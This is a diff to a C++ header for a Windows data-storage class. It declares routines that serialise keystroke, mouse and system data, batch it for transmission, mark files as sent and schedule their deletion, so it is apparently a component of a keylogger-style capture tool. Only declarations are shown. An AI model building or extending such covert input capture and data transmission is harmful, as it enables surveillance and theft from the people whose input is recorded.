@@ -4,13 +4,11 @@
 
 #include "data/KeyData.h"
 #include "utils/SystemUtils.h"
-#include "core/Platform.h"
 #include <string>
 #include <vector>
 #include <mutex>
 #include <chrono>
-
-#include "MouseHook.h"
+#include <windows.h>
 
 // Forward declarations
 class Configuration;
@@ -84,8 +82,6 @@ public:
     bool IsBatchReady() const;
     std::vector<uint8_t> GetBatchData();
 
-    static void AddMouseData(const MouseHookData & mouse_data);
-
 private:
     Configuration* m_config;
     std::string m_storagePath;
@@ -112,19 +108,14 @@ private:
     void RotateDataFileIfNeeded();
     void RotateDataFile();
 
-    std::vector<std::string> GetDataFilesReadyForTransmission();
-
     std::vector<std::string> GetDataFilesReadyForTransmission() const;
-
-    static void MarkFileAsTransmitted(const std::string& filePath);
-    static void ScheduleFileDeletion(const std::string& filePath, uint64_t delayMs);
+    void MarkFileAsTransmitted(const std::string& filePath);
+    void ScheduleFileDeletion(const std::string& filePath, uint64_t delayMs);
     
     static std::string KeyDataToString(const KeyData& data);
     static std::string MouseDataToString(const MouseData& data);
     static std::string SystemInfoToString(const utils::SystemInfo& info);
-
     static std::string SystemEventToString(const SystemEventData& event);
-
     static std::string GenerateBatchId();
 };
 
